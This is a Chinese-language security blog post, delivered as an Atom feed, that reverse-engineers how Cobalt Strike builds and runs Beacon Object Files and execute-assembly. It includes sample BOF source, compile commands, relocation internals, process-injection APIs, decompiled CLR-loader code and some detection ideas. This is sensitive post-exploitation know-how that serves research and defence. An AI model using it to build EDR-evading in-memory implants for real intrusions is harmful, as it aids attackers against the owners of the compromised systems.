<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HaCky的安全备忘录</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findream.github.io/"/>
  <updated>2022-11-12T07:14:20.771Z</updated>
  <id>https://findream.github.io/</id>
  
  <author>
    <name>HaCky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CobaltStrike BOF生成原理分析</title>
    <link href="https://findream.github.io/2022/11/26/Cobalt%20Strike%20BOF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/11/26/Cobalt Strike BOF原理分析/</id>
    <published>2022-11-26T06:02:11.000Z</published>
    <updated>2022-11-12T07:14:20.771Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文首发于跳跳糖安全社区<a href="https://tttang.com/archive/1786/" target="_blank" rel="external">https://tttang.com/archive/1786/</a></li></ul><a id="more"></a><h2 id="0x01-Beacon-Object-File"><a href="#0x01-Beacon-Object-File" class="headerlink" title="0x01 Beacon Object File"></a>0x01 Beacon Object File</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF(Beacon 对象文件)是C/C++编译，但未链接产生的Obj文件，BOF运行在Beacon进程中，并执行内部的Beacon API和Win32 API函数。BOF本质是COFF Obj文件，其符合COFF文件格式规范，结构类似于windows PE文件格式。在被Cobalt Strike加载和使用过程中，BOF是一段地址无关的Shellcode，BOF本身体积比较小，在传输过程中，适用于那些传输带宽小的模式，然后其本身运行在beacon进程内部，不会重新创建进程，也可以有效规避EDR。</p><h2 id="0x02-如何开发BOF"><a href="#0x02-如何开发BOF" class="headerlink" title="0x02 如何开发BOF"></a>0x02 如何开发BOF</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是官方提供的一个demo<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"beacon.h"</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">char</span> * args, <span class="keyword">int</span> alen)</span> </span>&#123;</div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"Hello World: %s"</span>, args);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用Visual Studio或者MinGW进行编译,最后生成.obj文件。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cl<span class="selector-class">.exe</span> /c /GS- hello<span class="selector-class">.c</span> /Fo hello.obj</div><div class="line">i686-w64-mingw32-gcc -c hello<span class="selector-class">.c</span> -o hello.o</div><div class="line">x86_64-w64-mingw32-gcc -c hello<span class="selector-class">.c</span> -o hello.o</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在cl.exe生成obj文件的时候，可能遇到<code>fatal error C1034: stdio.h: 不包括路径集</code>问题，产生这个的原因是没有设置对应的INCLUDE和LIB环境变量。而且不能仅仅设置Vs的Include的路径，还要设置SDK的路径。具体如下：<a href="https://blog.csdn.net/weixin_41115751/article/details/89817123" target="_blank" rel="external">https://blog.csdn.net/weixin_41115751/article/details/89817123</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在生成.obj之后，使用inline-execute + obj_path 执行obj文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF内部自带4种API，<code>数据解析API</code>，主要解析Aggressor Script 使用bof_pack函数打包的参数。<code>打印输出API</code>，主要起到打印输出的作用。格式化API，以及内部API。内部API主要包含一些令牌句柄的使用，以及进程注入相关的API。具体细节可以参考<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">官方的Bof文档</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据解析API主要包含：</p><ul><li>char <em> BeaconDataExtract (datap </em> parser, int * size)</li><li>int BeaconDataInt (datap * parser)</li><li>int BeaconDataLength (datap * parser)</li><li>void BeaconDataParse (datap <em> parser, char </em> buffer, int size)</li><li>short BeaconDataShort (datap * parser)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon.h中可以看到这些API原型。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Token Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconUseToken</span><span class="params">(HANDLE token)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconRevertToken</span><span class="params">()</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconIsAdmin</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* Spawn+Inject Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconGetSpawnTo</span><span class="params">(BOOL x86, <span class="keyword">char</span> * buffer, <span class="keyword">int</span> length)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconInjectProcess</span><span class="params">(HANDLE hProc, <span class="keyword">int</span> pid, <span class="keyword">char</span> * payload, <span class="keyword">int</span> p_len, <span class="keyword">int</span> p_offset, <span class="keyword">char</span> * arg, <span class="keyword">int</span> a_len)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconInjectTemporaryProcess</span><span class="params">(PROCESS_INFORMATION * pInfo, <span class="keyword">char</span> * payload, <span class="keyword">int</span> p_len, <span class="keyword">int</span> p_offset, <span class="keyword">char</span> * arg, <span class="keyword">int</span> a_len)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconSpawnTemporaryProcess</span><span class="params">(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconCleanupProcess</span><span class="params">(PROCESS_INFORMATION * pInfo)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* Utility Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">toWideChar</span><span class="params">(<span class="keyword">char</span> * src, <span class="keyword">wchar_t</span> * dst, <span class="keyword">int</span> max)</span></span>;</div></pre></td></tr></table></figure></p><h2 id="0x03-动态函数解析-DFR"><a href="#0x03-动态函数解析-DFR" class="headerlink" title="0x03 动态函数解析(DFR)"></a>0x03 动态函数解析(DFR)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态函数解析，即Dynamic Function Resolution (DFR)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下demo的功能是查找当前域，需要使用两个API函数DsGetDcNameA,NetApiBufferFree都是由NETAPI32模块进行导出。</p><ul><li>DECLSPEC_IMPORT：导入函数的关键字</li><li>WINAPI：函数调用约定，一般API函数都是这个</li><li>NETAPI32：函数所在的模块名</li><li>DsGetDcNameA/NetApiBufferFree：函数名称</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dsgetdc.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="string">"beacon.h"</span> </span></div><div class="line">DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID)<span class="comment">; </span></div><div class="line">DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID)<span class="comment">; </span></div><div class="line">void go(char * args, <span class="built_in">int</span> alen) &#123; </div><div class="line">DWORD dwRet<span class="comment">; </span></div><div class="line">PDOMAIN_CONTROLLER_INFO pdcInfo；</div><div class="line">dwRet = NETAPI32$DsGetDcNameA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pdcInfo)<span class="comment">; </span></div><div class="line"><span class="keyword">if</span> (ERROR_SUCCESS == dwRet) &#123; </div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"%s"</span>, pdcInfo-&gt;DomainName)<span class="comment">; </span></div><div class="line">&#125; </div><div class="line">NETAPI32$NetApiBufferFree(pdcInfo)<span class="comment">; </span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用<a href="https://github.com/dtmsecurity/bof_helper" target="_blank" rel="external">bof_help</a>这个工具自动修改符合BOF格式的函数原型。但目前来说可能不是很好用了。参考自<a href="https://idiotc4t.com/weaponization/bof-weaponization" target="_blank" rel="external">https://idiotc4t.com/weaponization/bof-weaponization</a></p><h2 id="0x04-Obj文件解析"><a href="#0x04-Obj文件解析" class="headerlink" title="0x04 Obj文件解析"></a>0x04 Obj文件解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OBj文件的文件类型是COFF Object，使用<code>dumpbin /all obj_path</code>解析Obj文件格式。Obj文件首先是_IMAGE_FILE_HEADER，保存着整个文件基本信息，然后依次保存着每个节区的<code>SECTION HEADER</code>和节区内容。然后接着就是重定位表，符号表。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件头格式如下：<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">typedef struct _IMAGE_FILE_HEADER &#123;</div><div class="line">    <span class="type">WORD</span>    <span class="type">Machine</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">NumberOfSections</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">TimeDateStamp</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">PointerToSymbolTable</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">NumberOfSymbols</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">SizeOfOptionalHeader</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">Characteristics</span>;</div><div class="line">&#125; <span class="type">IMAGE_FILE_HEADER</span>, *<span class="type">PIMAGE_FILE_HEADER</span>;</div></pre></td></tr></table></figure></p><ul><li>Machine为0x14c，表示这是一个x86的Obj</li><li>NumberOfSections为4，说明有4个Section</li><li>TimeDateStamp是时间戳</li><li>PointerToSymbolTable;指向符号表</li><li>NumberOfSymbols：符号个数<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">FILE HEADER VALUES</div><div class="line">             <span class="number">14</span>C machine (x86)</div><div class="line">               <span class="number">4</span> <span class="built_in">number</span> <span class="keyword">of</span> sections</div><div class="line">        <span class="number">63</span>*E60*D <span class="built_in">time</span> <span class="built_in">date</span> stamp Thu ***  <span class="number">6</span> <span class="number">13</span>:*:<span class="number">29</span> <span class="number">20</span>**</div><div class="line">             <span class="number">1E6</span> <span class="built_in">file</span> pointer <span class="keyword">to</span> symbol table</div><div class="line">               D <span class="built_in">number</span> <span class="keyword">of</span> symbols</div><div class="line">               <span class="number">0</span> size <span class="keyword">of</span> optional header</div><div class="line">               <span class="number">0</span> characteristics</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;节区头的结构体如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</div><div class="line">    <span class="keyword">BYTE </span>   Name[IMAGE_SIZEOF_SHORT_NAME]<span class="comment">;</span></div><div class="line">    union &#123;</div><div class="line">            DWORD   PhysicalAddress<span class="comment">;</span></div><div class="line">            DWORD   VirtualSize<span class="comment">;</span></div><div class="line">    &#125; Misc<span class="comment">;</span></div><div class="line">    DWORD   VirtualAddress<span class="comment">;</span></div><div class="line">    DWORD   SizeOfRawData<span class="comment">;</span></div><div class="line">    DWORD   PointerToRawData<span class="comment">;</span></div><div class="line">    DWORD   PointerToRelocations<span class="comment">;</span></div><div class="line">    DWORD   PointerToLinenumbers<span class="comment">;</span></div><div class="line">    WORD    NumberOfRelocations<span class="comment">;</span></div><div class="line">    WORD    NumberOfLinenumbers<span class="comment">;</span></div><div class="line">    DWORD   Characteristics<span class="comment">;</span></div><div class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER<span class="comment">;</span></div></pre></td></tr></table></figure></p><ul><li>Name:表示节区的名字</li><li>SizeOfRawData：表示节区数据的大小</li><li>PointerToRawData：表示节区数据的偏移或者指针。<br>  <img src="http://hacky.wang/blog/20221006/mDIFeQ5nddDi.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;text段<br>    <img src="http://hacky.wang/blog/20221006/MptBSPCSbpal.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表<br>    <img src="http://hacky.wang/blog/20221006/w8Esfhuxpqen.png?imageslim" alt="mark"></p><h2 id="0x05-服务端BOF实现原理"><a href="#0x05-服务端BOF实现原理" class="headerlink" title="0x05 服务端BOF实现原理"></a>0x05 服务端BOF实现原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是如何定位入口点，如果熟悉Cobalt Strike伪源码的，应该知道Cobalt Strike的命令分发执行位于BeaconConsole.java的<code>public void actionPerformed(ActionEvent var1)</code>函数，如果不熟悉Cobalt Strike伪源码呢，使用notepad++的文件夹搜索功能，搜索<code>inline-execute</code>也可以定位到<code>public void actionPerformed(ActionEvent var1)</code>函数。<br>    <img src="http://hacky.wang/blog/20220620/vekIhsaPBo9u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，可以看见，当执行<code>inline-execute</code>命令时，首先会将命令中的objectfile的路径解析出来，然后作为参数传入<code>InlineExecuteObject</code>函数。<br>    <img src="http://hacky.wang/blog/20220620/pUGP2rSrapKT.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>InlineExecuteObject</code>函数中，首先，调用DataUtils.getBeacon获取Beacon的各种信息，这里使用到的是CPU架构。然后传入<code>this.InlineExecuteObject</code>函数中。最终调用go()这个函数。<br>    <img src="http://hacky.wang/blog/20220620/n4LkdTY9m5vR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在go这个函数中，依次获取架构，是x64还是x86，并判断Obj的架构和beacon的架构是否一致，一致才可以继续<br>    <img src="http://hacky.wang/blog/20220620/nArcas0kygdP.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取Object文件，分别解析Code段，RData段，Data段，和Relocations段，复制这些段的数据，复制原理如下，首先，通过解析Header中的数据，可以获取各个段的起始地址和大小，这样就可以获取各个段的范围，然后就可以获取指定段的内容。<br>    <img src="http://hacky.wang/blog/20220620/bAOTHyCmqais.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220620/qG4GLthj00qY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>getRelocations()</code>函数中，会根据不同的段，插入不同的Magic Number。例如，如果是.rdata，则会插入1024，如果是.data，则会插入1025，如果是.text，则会插入1026，如果是DynamicFunction，则会插入1027，最后以插入1028结尾。<br>    <img src="http://hacky.wang/blog/20220620/W4shAFvgNzou.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同时，可以看到插入数据的结构，首先是插入的Type(类型)，然后插入一个Magic Number,第三是插入偏移，最后插入在段中的偏移。有个例外，针对DynamicFunction这块的处理可能需要插入其他的数据。<br>    <img src="http://hacky.wang/blog/20220620/JI701R83bkMS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着是构造命令，依次添加命令号，添加obj的入口点，添加code，添加Rdata，添加data，添加Relocations，和Arguments，这个Arguments没理解是什么东西。<br>    <img src="http://hacky.wang/blog/20220620/7cJRR5CvXTdj.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220620/S7APY2D3K5Al.png?imageslim" alt="mark"></p><h2 id="0x06-beacon端调用原理分析"><a href="#0x06-beacon端调用原理分析" class="headerlink" title="0x06 beacon端调用原理分析"></a>0x06 beacon端调用原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon分为loader和payload，loader可以自行开发，payload采用反射注入的方式进行加载，默认情况下，导出表有两个函数，一个是<code>ReflectiveLoader</code>另外一个是<code>DllEntryPoint</code>。在执行payload的时候，优先执行ReflectiveLoader，在处理完PE数据后，跳转到<code>DllEntryPoint</code>函数，然后根据dll加载的原因选择进行数据的初始化，还是进行工作。<br>    <img src="http://hacky.wang/blog/20220621/dSnpaJImNvt7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在4.1的Cobalt Strike生成的beacon中，大概在这个地方(Sub_336560_CommandDisPatch)进行命令操作。<br>    <img src="http://hacky.wang/blog/20220621/exGqnQP1GMpi.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是服务端传来的原始数据，显然，前四个字节正好是100，为命令号，和cobaltstrike发送命令数据的结构一致。<br>    <img src="http://hacky.wang/blog/20220621/WBk5efP42kHE.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/ObjoluTJl3MY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在函数<code>Sub_336560_CommandDisPatch</code>中，显然可以看到，首先解析出命令号，然后将除了命令号以外的数据作为第二个参数传入，将结果作为第三个参数传入，用以获取执行的结果。<br>    <img src="http://hacky.wang/blog/20220621/wJHauWaHdJli.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据命令号，选择不同需要执行的函数，此处将该函数命名为<code>Sub_32D020_inline_execute</code>,在<code>Sub_32D020_inline_execute</code>中，首先依次解析Code段，RData段，Data段，Relocations段，和Arguments。<br>    <img src="http://hacky.wang/blog/20220621/9WaE6eHifaRK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，便开始解析Relocations段，cobaltstrike通过不同的硬编码数据将不同的数据类型进行分割，0x400表示.rdata段，0x401表示.data段，0x402表示.text段，0x403表示DynamicFunction，0x404则表示结束。<br>    <img src="http://hacky.wang/blog/20220621/KnJymTWvmyj9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Sub_32D4F4_WriteOffset</code>函数的目的是修改代码段中的一些常量或者DynamicFunction的地址，因为在汇编层级，这些地址都是偏移量，所以需要计算偏移量并写入代码中，才能实现调用。<br>    <img src="http://hacky.wang/blog/20220621/2nH6quhrrMif.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/WxNuQYEu6DnF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后执行shellcode<br>    <img src="http://hacky.wang/blog/20220621/up02oD67Upiy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下是传入的数据。显然，第一行是命令号和EntryPoint，然后下面是code段和rdata段，再下面是Relocations段。<br>    <img src="http://hacky.wang/blog/20220621/T8PSHxAlkHVT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/noddhlG1332V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在对比一下原始的code段，和需要执行的shellcode的区别，很显然，关于常量的偏移地址是不同的。也就是说此处做了重定位。<br>    <img src="http://hacky.wang/blog/20220621/P4VHTIPSQbHE.png?imageslim" alt="mark"></p><h2 id="0x07-检测思路"><a href="#0x07-检测思路" class="headerlink" title="0x07 检测思路"></a>0x07 检测思路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常规的工具(BeaconEye)可能没有什么好的检测思路，我之前设想过，通过beaconEye有没有可能检测BOF，但是后来仔细想了一下发现不行，因为BeaconEye通过检测内存中的特征码实现的，但是BOF在调用执行完shellcode的时候就被释放了，可能无法检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从流量角度看，传入的流量数据，起始的命令号(100)以及getRelocations中的Magic Number是否可以作为检测依据？</p><h2 id="0x08-execuate-assembly"><a href="#0x08-execuate-assembly" class="headerlink" title="0x08 execuate-assembly"></a>0x08 execuate-assembly</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在CobaltStrike3中，新增了名为<code>execuate-assembly</code>命令，该命令本质是实现了在内存中加载.Net程序集。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行<code>execute-assembly</code>命令之后，判断是否存在参数，如果存在参数，得到CSharp程序路径和参数，分别传入ExecuteAssembly，如果不存在参数，只需要传入CSharp程序路径。<br>    <img src="http://hacky.wang/blog/20221008/K1EkkcUr1ty5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>ExecuteAssembly</code>函数中，首先读取Charp程序，并判断其是否是一个.NET程序，然后根据Beacon判断是否是64位系统，如果是X64的话，则会加载X64的装载程序初始化CRL环境并加载.NET程序<br>    <img src="http://hacky.wang/blog/20221008/JkLeI6gSyarK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;读取<code>resources/invokeassembly.dll</code>文件，该程序的作用是初始化CLR以及加载.Net程序集，然后将<code>invokeassembly.dll</code>,<code>CSharp程序</code>，以及一些配置信息一起发送给beacon。<br>    <img src="http://hacky.wang/blog/20221008/kVUxJSQWSpiv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon.exe，第70号命令即为<code>execte-assembly</code>,其逻辑也很简单，在解析玩配置信息之后，拉起一个Rundll32进程，然后将invokeassembly.dll注入进去，invokeassembly.dll就会在rundll32中初始化环境并加载程序集了。<br>    <img src="http://hacky.wang/blog/20221008/mHYYLhIpySQN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;转储了invokeassembly.dll，拖到IDA中，发现其和beacon一样采用了反射注入的方式。直接定位到关键函数。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">__int64 __fastcall sub_180001470(__int64 a1,<span class="built_in"> const </span>void *a2, unsigned<span class="built_in"> int </span>a3)</div><div class="line">&#123;</div><div class="line">[.....]</div><div class="line">  v6 = GetStdHandle(0xFFFFFFF5);</div><div class="line">  SetStdHandle(0xFFFFFFF4, v6);</div><div class="line"> <span class="built_in"> if </span>( !sub_180001294(&amp;v16) )</div><div class="line">  &#123;</div><div class="line">    result = Sub_1800022B8_Output(<span class="string">"[-] Failed to create the runtime host\n"</span>, v7);</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">  &#125;</div><div class="line">  v9 = (*(*v16 + 80i64))(v16);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] CLR failed to start w/hr 0x%08lx\n"</span>;</div><div class="line">LABEL_5:</div><div class="line">    result = Sub_1800022B8_Output(v10, v9);</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">  &#125;</div><div class="line"> <span class="built_in"> if </span>( v18 )</div><div class="line">    ((*v18)[2])(v18);</div><div class="line">  v18 = 0i64;</div><div class="line">  v9 = (*(*v16 + 104i64))(v16, &amp;v18);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  v11 = v18;</div><div class="line"> <span class="built_in"> if </span>( !v18 )</div><div class="line">  &#123;</div><div class="line">    sub_180001DA0(0x80004003i64);</div><div class="line">    __debugbreak();</div><div class="line">  &#125;</div><div class="line"> <span class="built_in"> if </span>( v22 )</div><div class="line">    (*(*v22 + 16i64))(v22);</div><div class="line">  v22 = 0i64;</div><div class="line">  v12 = *v11;</div><div class="line">  v13 = sub_180001000(&amp;v22);</div><div class="line">  v9 = (*v12)(v11, &amp;unk_180010510, v13);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] Failed to get default AppDomain w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  rgsabound.cElements = v3;</div><div class="line">  rgsabound.l<span class="class">Lbound = 0;</span></div><div class="line">  v14 = SafeArrayCreate(0x11u, 1u, &amp;rgsabound);</div><div 